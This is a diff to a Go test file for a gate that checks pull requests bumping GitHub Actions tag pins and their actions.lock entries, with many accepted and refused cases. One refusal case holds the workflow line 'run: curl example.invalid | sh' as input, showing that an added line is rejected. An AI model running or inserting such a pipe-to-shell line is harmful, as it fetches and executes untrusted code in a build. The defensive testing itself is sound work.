@@ -1,6 +1,7 @@
 package actions
 
 import (
+	"fmt"
 	"reflect"
 	"strings"
 	"testing"
@@ -51,7 +52,8 @@ jobs:
       - run: go test ./...
 `
 
-	// ciCommits is the same workflow with commit pins and no lockfile.
+	// ciCommits is the same workflow with commit pins, which the gate does
+	// not read, and a call of a reusable workflow.
 	ciCommits = `name: ci
 on: [push]
 jobs:
@@ -90,7 +92,7 @@ dependencies:
 
 // file is a regular file at both commits.
 func file(path, base, head string) facts.File {
-	return facts.File{Path: path, BaseMode: regularFile, HeadMode: regularFile, Base: []byte(base), Head: []byte(head)}
+	return facts.File{Path: path, BaseMode: facts.RegularFile, HeadMode: facts.RegularFile, Base: []byte(base), Head: []byte(head)}
 }
 
 // edit replaces each old with its new, in pairs. Every old must occur, so
@@ -119,7 +121,10 @@ func setupGoBump(t *testing.T) []facts.File {
 }
 
 func TestReadChangeSetAccepts(t *testing.T) {
-	setupGoLocked := pin{name: "actions/setup-go", from: "v7.0.0", to: "v7.1.0", oldCommit: setupGoV700, newCommit: setupGoV710, locked: true, ownerID: actionsOwnerID, repoID: setupGoRepoID}
+	setupGoLocked := pin{name: "actions/setup-go", from: "v7.0.0", to: "v7.1.0", oldCommit: setupGoV700, newCommit: setupGoV710, ownerID: actionsOwnerID, repoID: setupGoRepoID}
+	// nested is lockText with an action that setup-go uses, recorded under
+	// its commit as the lockfile does for such an action.
+	nested := lockText + commitEntry("actions/checkout", "v6.0.2", checkoutV602, checkoutRepoID)
 
 	tests := []struct {
 		name  string
@@ -142,35 +147,32 @@ func TestReadChangeSetAccepts(t *testing.T) {
 				}
 			},
 			want: []pin{
-				{name: "actions/checkout", from: "v7.0.0", to: "v7.0.1", oldCommit: checkoutV700, newCommit: checkoutV701, locked: true, ownerID: actionsOwnerID, repoID: checkoutRepoID, where: ciPath + ":7"},
+				{name: "actions/checkout", from: "v7.0.0", to: "v7.0.1", oldCommit: checkoutV700, newCommit: checkoutV701, ownerID: actionsOwnerID, repoID: checkoutRepoID, where: ciPath + ":7"},
 				with(setupGoLocked, ciPath+":9"),
 			},
 		},
 		{
-			// The workflow also calls a reusable workflow, on a line this
-			// pull request leaves alone: only a changed line is judged.
-			name: "commit lines, no lockfile, beside an unchanged reusable-workflow line",
+			// The workflow also has commit pins and calls a reusable
+			// workflow, on lines this pull request leaves alone: only a
+			// changed line is judged.
+			name: "beside unchanged commit pins and an unchanged reusable-workflow line",
 			files: func(t *testing.T) []facts.File {
-				return []facts.File{file(ciPath, ciCommits, edit(t, ciCommits,
-					setupGoV700+" # v7.0.0", setupGoV710+" # v7.1.0",
-					checkoutV700+" # v7.0.0", checkoutV701+" # v7.0.1"))}
+				fs := setupGoBump(t)
+				both := ciCommits + "      - uses: actions/setup-go@v7.0.0\n"
+				fs[1] = file(ciPath, both, edit(t, both, "setup-go@v7.0.0", "setup-go@v7.1.0"))
+				return fs
 			},
-			want: []pin{
-				{name: "actions/checkout", from: "v7.0.0", to: "v7.0.1", oldCommit: checkoutV700, newCommit: checkoutV701, where: ciPath + ":7"},
-				{name: "actions/setup-go", from: "v7.0.0", to: "v7.1.0", oldCommit: setupGoV700, newCommit: setupGoV710, where: ciPath + ":9"},
-			},
+			want: []pin{with(setupGoLocked, ciPath+":13")},
 		},
 		{
 			name: "the same pin on several lines and files is one update",
 			files: func(t *testing.T) []facts.File {
-				two := ciCommits + "  again:\n    steps:\n      - uses: actions/setup-go@" + setupGoV700 + " # v7.0.0\n"
-				return []facts.File{
-					file(ciPath, two, edit(t, two, setupGoV700+" # v7.0.0", setupGoV710+" # v7.1.0")),
-					file("action.yml", "runs:\n  steps:\n    - uses: actions/setup-go@"+setupGoV700+" # v7.0.0\n", "runs:\n  steps:\n    - uses: actions/setup-go@"+setupGoV710+" # v7.1.0\n"),
-					file(".github/actions/build/action.yaml", "    - uses: actions/setup-go@"+setupGoV700+" # v7.0.0\n", "    - uses: actions/setup-go@"+setupGoV710+" # v7.1.0\n"),
-				}
+				fs := setupGoBump(t)
+				two := ciTags + "  again:\n    steps:\n      - uses: actions/setup-go@v7.0.0\n"
+				fs[1] = file(ciPath, two, edit(t, two, "setup-go@v7.0.0", "setup-go@v7.1.0"))
+				return append(fs, file(".github/workflows/lint.yaml", "    - uses: actions/setup-go@v7.0.0\n", "    - uses: actions/setup-go@v7.1.0\n"))
 			},
-			want: []pin{{name: "actions/setup-go", from: "v7.0.0", to: "v7.1.0", oldCommit: setupGoV700, newCommit: setupGoV710, where: ciPath + ":9"}},
+			want: []pin{with(setupGoLocked, ciPath+":9")},
 		},
 		{
 			name: "the spelling of the workflow line is the update's name",
@@ -180,7 +182,7 @@ func TestReadChangeSetAccepts(t *testing.T) {
 				fs[1].Head = []byte(edit(t, string(fs[1].Head), "actions/setup-go", "Actions/Setup-Go"))
 				return fs
 			},
-			want: []pin{{name: "Actions/Setup-Go", from: "v7.0.0", to: "v7.1.0", oldCommit: setupGoV700, newCommit: setupGoV710, locked: true, ownerID: actionsOwnerID, repoID: setupGoRepoID, where: ciPath + ":9"}},
+			want: []pin{{name: "Actions/Setup-Go", from: "v7.0.0", to: "v7.1.0", oldCommit: setupGoV700, newCommit: setupGoV710, ownerID: actionsOwnerID, repoID: setupGoRepoID, where: ciPath + ":9"}},
 		},
 		{
 			name: "tag line that ends in a comment",
@@ -193,40 +195,45 @@ func TestReadChangeSetAccepts(t *testing.T) {
 			want: []pin{with(setupGoLocked, ciPath+":9")},
 		},
 		{
-			name: "commit line that actions.lock also records under a commit key",
-			files: func(t *testing.T) []facts.File {
-				lock := "workflows:\n    '.github/workflows/ci.yml':\n        - 'actions/setup-go@" + setupGoV700 + "'\ndependencies:\n    'actions/setup-go@" + setupGoV700 + "':\n        ref: 'v7.0.0'\n        commit: 'sha1-" + setupGoV700 + "'\n        owner_id: 44036562\n        repo_id: 192624594\n"
-				return []facts.File{
-					file(lockPath, lock, edit(t, lock, setupGoV700, setupGoV710, "ref: 'v7.0.0'", "ref: 'v7.1.0'")),
-					file(ciPath, ciCommits, edit(t, ciCommits, setupGoV700+" # v7.0.0", setupGoV710+" # v7.1.0")),
-				}
-			},
-			want: []pin{with(setupGoLocked, ciPath+":9")},
-		},
-		{
 			name: "an action that a bumped action uses, moved in place, is its own update",
 			files: func(t *testing.T) []facts.File {
-				lock := lockText + "        uses:\n            - 'actions/checkout@" + checkoutV602 + "'\n    'actions/checkout@" + checkoutV602 + "':\n        ref: 'v6.0.2'\n        commit: 'sha1-" + checkoutV602 + "'\n        owner_id: 44036562\n        repo_id: 197814629\n"
 				return []facts.File{
-					file(lockPath, lock, edit(t, lock,
+					file(lockPath, nested, edit(t, nested,
 						"setup-go@v7.0.0", "setup-go@v7.1.0", "ref: 'v7.0.0'\n        commit: 'sha1-"+setupGoV700, "ref: 'v7.1.0'\n        commit: 'sha1-"+setupGoV710,
 						checkoutV602, checkoutV610, "ref: 'v6.0.2'", "ref: 'v6.1.0'")),
 					file(ciPath, ciTags, edit(t, ciTags, "setup-go@v7.0.0", "setup-go@v7.1.0")),
 				}
 			},
 			want: []pin{
-				{name: "actions/checkout", from: "v6.0.2", to: "v6.1.0", oldCommit: checkoutV602, newCommit: checkoutV610, locked: true, ownerID: actionsOwnerID, repoID: checkoutRepoID, where: lockPath + ":22"},
+				{name: "actions/checkout", from: "v6.0.2", to: "v6.1.0", oldCommit: checkoutV602, newCommit: checkoutV610, ownerID: actionsOwnerID, repoID: checkoutRepoID, where: lockPath + ":22"},
 				with(setupGoLocked, ciPath+":9"),
 			},
 		},
 		{
-			name: "a commit line for an action in a directory takes the IDs of the lockfile entry for the same move",
+			// A workflow names the tag and another action the commit of the
+			// same release: two entries, one update.
+			name: "a tag entry and a commit entry for the same move are one update",
 			files: func(t *testing.T) []facts.File {
-				fs := setupGoBump(t)
-				sub := "jobs:\n  lint:\n    steps:\n      - uses: actions/setup-go/sub/action@" + setupGoV700 + " # v7.0.0\n"
-				return append(fs, file(".github/workflows/lint.yaml", sub, edit(t, sub, setupGoV700+" # v7.0.0", setupGoV710+" # v7.1.0")))
+				both := lockText + commitEntry("actions/setup-go", "v7.0.0", setupGoV700, setupGoRepoID)
+				return []facts.File{
+					file(lockPath, both, edit(t, both, "setup-go@v7.0.0", "setup-go@v7.1.0", "ref: 'v7.0.0'\n        commit: 'sha1-"+setupGoV700, "ref: 'v7.1.0'\n        commit: 'sha1-"+setupGoV710, "setup-go@"+setupGoV700, "setup-go@"+setupGoV710)),
+					file(ciPath, ciTags, edit(t, ciTags, "setup-go@v7.0.0", "setup-go@v7.1.0")),
+				}
 			},
 			want: []pin{with(setupGoLocked, ciPath+":9")},
+		},
+		{
+			// A downgrade is a shape: the Increase fact refuses it, not the
+			// reader.
+			name: "a downgrade",
+			files: func(t *testing.T) []facts.File {
+				fs := setupGoBump(t)
+				for i := range fs {
+					fs[i].Base, fs[i].Head = fs[i].Head, fs[i].Base
+				}
+				return fs
+			},
+			want: []pin{{name: "actions/setup-go", from: "v7.1.0", to: "v7.0.0", oldCommit: setupGoV710, newCommit: setupGoV700, ownerID: actionsOwnerID, repoID: setupGoRepoID, where: ciPath + ":9"}},
 		},
 	}
 	for _, tt := range tests {
@@ -248,20 +255,56 @@ func with(p pin, where string) pin {
 	return p
 }
 
+// commitEntry is what follows lockText for an action that its last
+// dependency uses: the uses list under that dependency, and the entry
+// keyed by the commit.
+func commitEntry(name, ref, commit string, repoID int64) string {
+	return fmt.Sprintf("        uses:\n            - '%[1]s@%[3]s'\n    '%[1]s@%[3]s':\n        ref: '%[2]s'\n        commit: 'sha1-%[3]s'\n        owner_id: 44036562\n        repo_id: %[4]d\n", name, ref, commit, repoID)
+}
+
 func TestReadChangeSetRefuses(t *testing.T) {
-	const step = "      - uses: actions/setup-go@" + setupGoV700 + " # v7.0.0\n"
-	bumped := strings.ReplaceAll(step, setupGoV700+" # v7.0.0", setupGoV710+" # v7.1.0")
-	// one is a workflow whose only changed line goes from base to head.
+	const (
+		step   = "      - uses: actions/setup-go@v7.0.0\n"
+		bumped = "      - uses: actions/setup-go@v7.1.0\n"
+		// The same step as a commit pin, which is not read.
+		pinned       = "      - uses: actions/setup-go@" + setupGoV700 + " # v7.0.0\n"
+		pinnedBumped = "      - uses: actions/setup-go@" + setupGoV710 + " # v7.1.0\n"
+	)
+	// one is setupGoBump's lockfile with a workflow whose only changed line
+	// goes from base to head. From step to bumped the shape holds, so a
+	// refusal below is the one edit's doing.
 	one := func(base, head string) func(*testing.T) []facts.File {
-		return func(*testing.T) []facts.File {
-			return []facts.File{file(ciPath, "steps:\n"+base, "steps:\n"+head)}
+		return func(t *testing.T) []facts.File {
+			return []facts.File{setupGoBump(t)[0], file(ciPath, "steps:\n"+base, "steps:\n"+head)}
 		}
+	}
+	if pins, problem := readChangeSet(one(step, bumped)(t)); problem != "" || len(pins) != 1 {
+		t.Fatalf("the pull request these cases edit: pins %+v, problem %q", pins, problem)
 	}
 	// lock is setupGoBump with its head lockfile edited further.
 	lock := func(pairs ...string) func(*testing.T) []facts.File {
 		return func(t *testing.T) []facts.File {
 			fs := setupGoBump(t)
 			fs[0].Head = []byte(edit(t, string(fs[0].Head), pairs...))
+			return fs
+		}
+	}
+	// bothLocks is setupGoBump with both lockfiles edited the same way.
+	bothLocks := func(pairs ...string) func(*testing.T) []facts.File {
+		return func(t *testing.T) []facts.File {
+			fs := setupGoBump(t)
+			fs[0].Base = []byte(edit(t, string(fs[0].Base), pairs...))
+			fs[0].Head = []byte(edit(t, string(fs[0].Head), pairs...))
+			return fs
+		}
+	}
+	// nestedBump is setupGoBump with a second, commit-keyed entry that
+	// moves from one commit and ref to another.
+	nestedBump := func(name, fromRef, fromCommit, toRef, toCommit string, repoID int64) func(*testing.T) []facts.File {
+		return func(t *testing.T) []facts.File {
+			fs := setupGoBump(t)
+			fs[0].Base = append(fs[0].Base, commitEntry(name, fromRef, fromCommit, repoID)...)
+			fs[0].Head = append(fs[0].Head, commitEntry(name, toRef, toCommit, repoID)...)
 			return fs
 		}
 	}
@@ -279,7 +322,11 @@ func TestReadChangeSetRefuses(t *testing.T) {
 			return []facts.File{file(ciPath, "jobs:\n  lint:\n"+base, "jobs:\n  lint:\n"+head)}
 		}
 	}
-	const pinsWorkflow = "the line pins a reusable workflow, which never merges without a person"
+	const (
+		pinsWorkflow = "the line pins a reusable workflow, which never merges without a person"
+		pinsCommit   = "the line pins a commit; only a tag pin that actions.lock records is read"
+		notAPin      = "the changed line is not an action pin"
+	)
 
 	tests := []struct {
 		name  string
@@ -299,11 +346,12 @@ func TestReadChangeSetRefuses(t *testing.T) {
 			return []facts.File{file(ciPath, "steps:\n  - "+strings.TrimLeft(base, " "), "steps:\n  - "+strings.TrimLeft(head, " "))}
 		}, pinsWorkflow},
 		{"a reusable workflow beside an action that would pass", func(t *testing.T) []facts.File {
-			return []facts.File{file(ciPath, ciCommits, edit(t, ciCommits,
-				setupGoV700+" # v7.0.0", setupGoV710+" # v7.1.0",
-				loginV470+" # v4.7.0", loginV480+" # v4.8.0"))}
+			fs := setupGoBump(t)
+			both := ciTags + "  lint:\n    uses: docker/login-action/.github/workflows/lint.yml@" + loginV470 + " # v4.7.0\n"
+			fs[1] = file(ciPath, both, edit(t, both, "setup-go@v7.0.0", "setup-go@v7.1.0", loginV470+" # v4.7.0", loginV480+" # v4.8.0"))
+			return fs
 		}, ciPath + ":12: " + pinsWorkflow},
-		{"a reusable workflow that actions.lock records too", func(t *testing.T) []facts.File {
+		{"a reusable workflow in another file", func(t *testing.T) []facts.File {
 			fs := setupGoBump(t)
 			base, head := reusable("actions/setup-go/.github/workflows/x.yml")
 			return append(fs, file(".github/workflows/lint.yaml", "jobs:\n  lint:\n"+base, "jobs:\n  lint:\n"+head))
@@ -315,47 +363,83 @@ func TestReadChangeSetRefuses(t *testing.T) {
 				"jobs:\n  lint:\n    uses: actions/setup-go/.github/workflows/x.yml@v7.1.0\n"))
 		}, pinsWorkflow},
 
+		// A commit pin is not read: a workflow line records no repository
+		// IDs, so Bound could never hold for it (amendment 7).
+		{"a commit pin", one(pinned, pinnedBumped), ciPath + ":2: " + pinsCommit},
+		{"a commit pin and no lockfile", func(*testing.T) []facts.File {
+			return []facts.File{file(ciPath, pinned, pinnedBumped)}
+		}, pinsCommit},
+		{"a commit pin of an action in a directory", one(
+			"      - uses: actions/setup-go/sub/action@"+setupGoV700+" # v7.0.0\n",
+			"      - uses: actions/setup-go/sub/action@"+setupGoV710+" # v7.1.0\n"), pinsCommit},
+		{"a commit pin whose version alone changed", one(pinned, strings.Replace(pinned, "# v7.0.0", "# v7.1.0", 1)), pinsCommit},
+		{"a commit pin whose commit alone changed", one(pinned, strings.Replace(pinned, setupGoV700, setupGoV710, 1)), pinsCommit},
+		{"commit pin became a tag pin", one(pinned, bumped), pinsCommit},
+		{"tag pin became a commit pin", one(step, pinnedBumped), pinsCommit},
+		{"a commit pin that actions.lock records under a commit key", func(t *testing.T) []facts.File {
+			lock := "version: 'v0.0.3'\nworkflows:\n    '.github/workflows/ci.yml':\n        - 'actions/setup-go@" + setupGoV700 + "'\ndependencies:\n    'actions/setup-go@" + setupGoV700 + "':\n        ref: 'v7.0.0'\n        commit: 'sha1-" + setupGoV700 + "'\n        owner_id: 44036562\n        repo_id: 192624594\n"
+			return []facts.File{
+				file(ciPath, "steps:\n"+pinned, "steps:\n"+pinnedBumped),
+				file(lockPath, lock, edit(t, lock, setupGoV700, setupGoV710, "ref: 'v7.0.0'", "ref: 'v7.1.0'")),
+			}
+		}, pinsCommit},
+		// The lockfile alone must not say a workflow runs a commit that
+		// no workflow line the gate reads names.
+		{"a workflow's list names a commit, and no workflow line changes", func(t *testing.T) []facts.File {
+			lock := "version: 'v0.0.3'\nworkflows:\n    '.github/workflows/ci.yml':\n        - 'actions/setup-go@" + setupGoV700 + "'\ndependencies:\n    'actions/setup-go@" + setupGoV700 + "':\n        ref: 'v7.0.0'\n        commit: 'sha1-" + setupGoV700 + "'\n        owner_id: 44036562\n        repo_id: 192624594\n"
+			return []facts.File{file(lockPath, lock, edit(t, lock, setupGoV700, setupGoV710, "ref: 'v7.0.0'", "ref: 'v7.1.0'"))}
+		}, lockPath + ":4: a workflow's list names a commit"},
+
 		{"no files", func(*testing.T) []facts.File { return nil }, "no file changed"},
 		{"another file changed too", func(t *testing.T) []facts.File {
 			return append(setupGoBump(t), file("go.mod", "module x\n", "module y\n"))
-		}, "not a workflow, an action.yml or actions.lock: go.mod"},
-		{"a path that is not shown", func(t *testing.T) []facts.File {
+		}, "not a workflow or actions.lock: go.mod"},
+		{"a path with characters that are escaped", func(t *testing.T) []facts.File {
 			return []facts.File{file("docs/\x1b[31mred.md", "a\n", "b\n")}
-		}, "(a path with unusual characters)"},
+		}, `not a workflow or actions.lock: docs/\x1b[31mred.md`},
 		{"workflow in a subdirectory", func(*testing.T) []facts.File {
 			return []facts.File{file(".github/workflows/sub/ci.yml", step, bumped)}
 		}, "not a workflow"},
 		{"a file named like an action but not one", func(*testing.T) []facts.File {
 			return []facts.File{file("my-action.yml", step, bumped)}
 		}, "not a workflow"},
-		{"symlink at head", func(*testing.T) []facts.File {
-			f := file(ciPath, step, bumped)
-			f.HeadMode = "120000"
-			return []facts.File{f}
+		// A local action's own steps are not read: no lockfile list is
+		// known to cover them.
+		{"a local action's metadata file", func(t *testing.T) []facts.File {
+			return append(setupGoBump(t), file("action.yml", "runs:\n  steps:\n"+step, "runs:\n  steps:\n"+bumped))
+		}, "not a workflow or actions.lock: action.yml"},
+		{"a local action in a directory", func(t *testing.T) []facts.File {
+			return append(setupGoBump(t), file(".github/actions/build/action.yaml", step, bumped))
+		}, "not a workflow or actions.lock: .github/actions/build/action.yaml"},
+		{"symlink at head", func(t *testing.T) []facts.File {
+			fs := one(step, bumped)(t)
+			fs[1].HeadMode = "120000"
+			return fs
 		}, "not a regular file at both commits (mode 100644 at base, 120000 at head)"},
-		{"executable", func(*testing.T) []facts.File {
-			f := file(ciPath, step, bumped)
-			f.BaseMode, f.HeadMode = "100755", "100755"
-			return []facts.File{f}
+		{"executable", func(t *testing.T) []facts.File {
+			fs := one(step, bumped)(t)
+			fs[1].BaseMode, fs[1].HeadMode = "100755", "100755"
+			return fs
 		}, "not a regular file"},
-		{"added file", func(*testing.T) []facts.File {
-			return []facts.File{{Path: ciPath, HeadMode: regularFile, Head: []byte(bumped)}}
+		{"added file", func(t *testing.T) []facts.File {
+			return []facts.File{setupGoBump(t)[0], {Path: ciPath, HeadMode: facts.RegularFile, Head: []byte(bumped)}}
 		}, "mode absent at base"},
-		{"deleted file", func(*testing.T) []facts.File {
-			return []facts.File{{Path: ciPath, BaseMode: regularFile, Base: []byte(step)}}
+		{"deleted file", func(t *testing.T) []facts.File {
+			return []facts.File{setupGoBump(t)[0], {Path: ciPath, BaseMode: facts.RegularFile, Base: []byte(step)}}
 		}, "absent at head"},
 		{"a line was added", one(step, bumped+"      - run: curl example.invalid | sh\n"), "different number of lines"},
 		{"a line was removed", one(step+"      - run: true\n", bumped), "different number of lines"},
 		{"final newline removed", one(step, strings.TrimSuffix(bumped, "\n")), "different number of lines"},
-		{"another line changed", one(step+"      - run: go test\n", bumped+"      - run: go test -short\n"), ciPath + ":3: the changed line is not an action pin"},
+		{"another line changed", one(step+"      - run: go test\n", bumped+"      - run: go test -short\n"), ciPath + ":3: " + notAPin},
 		{"the action changed", one(step, strings.Replace(bumped, "actions/setup-go", "actions/setup-node", 1)), "more than the commit and version changed"},
 		{"the owner changed", one(step, strings.Replace(bumped, "actions/", "actionz/", 1)), "more than the commit and version changed"},
 		{"the case of the name changed", one(step, strings.Replace(bumped, "actions/", "Actions/", 1)), "more than the commit and version changed"},
 		{"a path was added", one(step, strings.Replace(bumped, "setup-go@", "setup-go/sub@", 1)), "more than the commit and version changed"},
 		{"the indentation changed", one(step, " "+bumped), "more than the commit and version changed"},
 		{"the dash was dropped", one(step, strings.Replace(bumped, "- uses", "  uses", 1)), "more than the commit and version changed"},
-		{"commit pin became a tag pin", one(step, "      - uses: actions/setup-go@v7.1.0\n"), "between a commit pin and a tag pin"},
-		{"tag line without a lockfile", one("      - uses: actions/setup-go@v7.0.0\n", "      - uses: actions/setup-go@v7.1.0\n"), "no changed actions.lock entry gives the commits"},
+		{"tag line without a lockfile", func(*testing.T) []facts.File {
+			return []facts.File{file(ciPath, step, bumped)}
+		}, "no changed actions.lock entry gives the commits"},
 		{"tag line whose comment changed", func(t *testing.T) []facts.File {
 			fs := setupGoBump(t)
 			fs[1].Base = []byte(edit(t, string(fs[1].Base), "setup-go@v7.0.0", "setup-go@v7.0.0 # old note"))
@@ -367,30 +451,27 @@ func TestReadChangeSetRefuses(t *testing.T) {
 			fs[1].Head = []byte(edit(t, string(fs[1].Head), "setup-go@v7.1.0", "setup-go@v7.1.0 # note"))
 			return fs
 		}, "more than the commit and version changed"},
-		{"tag line whose comment is not ASCII", one("      - uses: actions/setup-go@v7.0.0 # caf\u00e9\n", "      - uses: actions/setup-go@v7.1.0 # caf\u00e9\n"), "not an action pin"},
-		{"tag line with text that is not a comment", one("      - uses: actions/setup-go@v7.0.0 with: x\n", "      - uses: actions/setup-go@v7.1.0 with: x\n"), "not an action pin"},
-		{"tag line with a # glued to the tag", one("      - uses: actions/setup-go@v7.0.0#x\n", "      - uses: actions/setup-go@v7.1.0#x\n"), "not an action pin"},
-		{"short commit", one(step, strings.Replace(bumped, setupGoV710, setupGoV710[:39], 1)), "not an action pin"},
-		{"upper-case commit", one(step, strings.Replace(bumped, setupGoV710, strings.ToUpper(setupGoV710), 1)), "not an action pin"},
-		{"two-part version comment", one(step, strings.Replace(bumped, "# v7.1.0", "# v7.1", 1)), "not an action pin"},
-		{"version without v", one(step, strings.Replace(bumped, "# v7.1.0", "# 7.1.0", 1)), "not an action pin"},
-		{"pre-release version", one(step, strings.Replace(bumped, "# v7.1.0", "# v7.1.0-rc.1", 1)), "not an action pin"},
-		{"leading zero in the version", one(step, strings.Replace(bumped, "# v7.1.0", "# v7.01.0", 1)), "not an action pin"},
-		{"text after the version", one(step, strings.Replace(bumped, "# v7.1.0", "# v7.1.0 pinned", 1)), "not an action pin"},
-		{"no comment", one(step, strings.Replace(bumped, " # v7.1.0", "", 1)), "not an action pin"},
-		{"two spaces before the comment", one(strings.Replace(step, " # ", "  # ", 1), strings.Replace(bumped, " # ", "  # ", 1)), "not an action pin"},
-		{"quoted value", one(`      - uses: "actions/setup-go@`+setupGoV700+`" # v7.0.0`+"\n", `      - uses: "actions/setup-go@`+setupGoV710+`" # v7.1.0`+"\n"), "not an action pin"},
-		{"tab indentation", one("\t- uses: actions/setup-go@"+setupGoV700+" # v7.0.0\n", "\t- uses: actions/setup-go@"+setupGoV710+" # v7.1.0\n"), "not an action pin"},
-		{"carriage return line ends", one(strings.Replace(step, "\n", "\r\n", 1), strings.Replace(bumped, "\n", "\r\n", 1)), "not an action pin"},
-		{"a second key on the line", one(step, strings.Replace(bumped, " # v7.1.0", " # v7.1.0   run: x", 1)), "not an action pin"},
-		{"docker reference", one("      - uses: docker://alpine@sha256:"+setupGoV700+"\n", "      - uses: docker://alpine@sha256:"+setupGoV710+"\n"), "not an action pin"},
-		{"local action", one("      - uses: ./build@"+setupGoV700+" # v7.0.0\n", "      - uses: ./build@"+setupGoV710+" # v7.1.0\n"), "not an action pin"},
-		{"repository named ..", one("      - uses: actions/..@"+setupGoV700+" # v7.0.0\n", "      - uses: actions/..@"+setupGoV710+" # v7.1.0\n"), "not an action pin"},
-		{"one version, two commits", func(*testing.T) []facts.File {
-			base := step + step
-			head := bumped + strings.Replace(bumped, setupGoV710, checkoutV701, 1)
-			return []facts.File{file(ciPath, base, head)}
-		}, "pinned to other commits elsewhere"},
+		{"tag line whose comment is not ASCII", one("      - uses: actions/setup-go@v7.0.0 # caf\u00e9\n", "      - uses: actions/setup-go@v7.1.0 # caf\u00e9\n"), notAPin},
+		{"tag line with text that is not a comment", one("      - uses: actions/setup-go@v7.0.0 with: x\n", "      - uses: actions/setup-go@v7.1.0 with: x\n"), notAPin},
+		{"tag line with a # glued to the tag", one("      - uses: actions/setup-go@v7.0.0#x\n", "      - uses: actions/setup-go@v7.1.0#x\n"), notAPin},
+		{"two-part version", one(step, strings.Replace(bumped, "@v7.1.0", "@v7.1", 1)), notAPin},
+		{"major-only version", one(step, strings.Replace(bumped, "@v7.1.0", "@v7", 1)), notAPin},
+		{"version without v", one(step, strings.Replace(bumped, "@v7.1.0", "@7.1.0", 1)), notAPin},
+		{"pre-release version", one(step, strings.Replace(bumped, "@v7.1.0", "@v7.1.0-rc.1", 1)), notAPin},
+		{"leading zero in the version", one(step, strings.Replace(bumped, "@v7.1.0", "@v7.01.0", 1)), notAPin},
+		{"a branch", one(step, strings.Replace(bumped, "@v7.1.0", "@main", 1)), notAPin},
+		{"quoted value", one(`      - uses: "actions/setup-go@v7.0.0"`+"\n", `      - uses: "actions/setup-go@v7.1.0"`+"\n"), notAPin},
+		{"tab indentation", one("\t- uses: actions/setup-go@v7.0.0\n", "\t- uses: actions/setup-go@v7.1.0\n"), notAPin},
+		{"carriage return line ends", one(strings.Replace(step, "\n", "\r\n", 1), strings.Replace(bumped, "\n", "\r\n", 1)), notAPin},
+		{"a second key on the line", one(step, strings.Replace(bumped, "@v7.1.0", "@v7.1.0   run: x", 1)), notAPin},
+		{"docker reference", one("      - uses: docker://alpine:3.20.0\n", "      - uses: docker://alpine:3.21.0\n"), notAPin},
+		{"local action", one("      - uses: ./build@v7.0.0\n", "      - uses: ./build@v7.1.0\n"), notAPin},
+		{"repository named ..", one("      - uses: actions/..@v7.0.0\n", "      - uses: actions/..@v7.1.0\n"), notAPin},
+		// The shapes of a commit pin that are not even recognised as one.
+		{"short commit", one(pinned, strings.Replace(pinnedBumped, setupGoV710, setupGoV710[:39], 1)), notAPin},
+		{"upper-case commit", one(pinned, strings.Replace(pinnedBumped, setupGoV710, strings.ToUpper(setupGoV710), 1)), notAPin},
+		{"commit pin without its version comment", one(pinned, strings.Replace(pinnedBumped, " # v7.1.0", "", 1)), notAPin},
+		{"commit pin with text after the version", one(pinned, strings.Replace(pinnedBumped, "# v7.1.0", "# v7.1.0 pinned", 1)), notAPin},
 
 		// actions.lock.
 		{"lockfile commit changed under an unchanged key", func(t *testing.T) []facts.File {
@@ -412,20 +493,15 @@ func TestReadChangeSetRefuses(t *testing.T) {
 		{"key names another action", lock("    'actions/setup-go@v7.1.0':", "    'actions/setup-node@v7.1.0':"), "more than the version or commit changed in the dependency key"},
 		{"tag key became a commit key", lock("    'actions/setup-go@v7.1.0':", "    'actions/setup-go@"+setupGoV710+"':"), "more than the version or commit changed in the dependency key"},
 		{"workflow path changed", lock("'.github/workflows/ci.yml':", "'.github/workflows/cd.yml':"), "not one a pin update rewrites"},
-		{"schema version changed", lock("version: 'v0.0.3'", "version: 'v0.0.4'"), "not one a pin update rewrites"},
 		{"upper case in a lockfile name", lock("    'actions/setup-go@v7.1.0':", "    'Actions/setup-go@v7.1.0':"), "a dependency key changed into something else"},
 		{"entry cut short", func(*testing.T) []facts.File {
-			return []facts.File{file(lockPath, "    'actions/setup-go@v7.0.0':\n        ref: 'v7.0.0'\n", "    'actions/setup-go@v7.1.0':\n        ref: 'v7.1.0'\n")}
+			return []facts.File{file(lockPath, "version: 'v0.0.3'\n    'actions/setup-go@v7.0.0':\n        ref: 'v7.0.0'\n", "version: 'v0.0.3'\n    'actions/setup-go@v7.1.0':\n        ref: 'v7.1.0'\n")}
 		}, "cut short"},
 		{"commit key is not the entry's commit", func(t *testing.T) []facts.File {
-			lockSHA := "        - 'actions/setup-go@" + setupGoV700 + "'\n    'actions/setup-go@" + setupGoV700 + "':\n        ref: 'v7.0.0'\n        commit: 'sha1-" + setupGoV700 + "'\n        owner_id: 44036562\n        repo_id: 192624594\n"
-			head := edit(t, lockSHA, setupGoV700, setupGoV710, "ref: 'v7.0.0'", "ref: 'v7.1.0'")
-			return []facts.File{file(lockPath, lockSHA, edit(t, head, "sha1-"+setupGoV710, "sha1-"+checkoutV701))}
+			fs := nestedBump("actions/checkout", "v6.0.2", checkoutV602, "v6.1.0", checkoutV610, checkoutRepoID)(t)
+			fs[0].Head = []byte(edit(t, string(fs[0].Head), "sha1-"+checkoutV610, "sha1-"+checkoutV701))
+			return fs
 		}, "the commit in the dependency key is not the entry's commit"},
-		{"commit key changed, ref did not", func(t *testing.T) []facts.File {
-			lockSHA := "        - 'actions/setup-go@" + setupGoV700 + "'\n    'actions/setup-go@" + setupGoV700 + "':\n        ref: 'v7.0.0'\n        commit: 'sha1-" + setupGoV700 + "'\n        owner_id: 44036562\n        repo_id: 192624594\n"
-			return []facts.File{file(lockPath, lockSHA, edit(t, lockSHA, setupGoV700, setupGoV710))}
-		}, "its ref did not"},
 		{"the same key twice", func(t *testing.T) []facts.File {
 			fs := setupGoBump(t)
 			again := "    'actions/setup-go@v7.0.0':\n        ref: 'v7.0.0'\n        commit: 'sha1-" + setupGoV700 + "'\n        owner_id: 44036562\n        repo_id: 192624594\n"
@@ -434,24 +510,46 @@ func TestReadChangeSetRefuses(t *testing.T) {
 			fs[0].Head = append(fs[0].Head, bumpedAgain...)
 			return fs
 		}, "does not match exactly one changed dependency entry"},
-		{"owner_id is not a number", func(t *testing.T) []facts.File {
-			fs := setupGoBump(t)
-			fs[0].Base = []byte(edit(t, string(fs[0].Base), "owner_id: 44036562\n        repo_id: 192624594", "owner_id: 0x2a\n        repo_id: 192624594"))
-			fs[0].Head = []byte(edit(t, string(fs[0].Head), "owner_id: 44036562\n        repo_id: 192624594", "owner_id: 0x2a\n        repo_id: 192624594"))
-			return fs
-		}, "not ref (a vX.Y.Z tag), commit, owner_id and repo_id"},
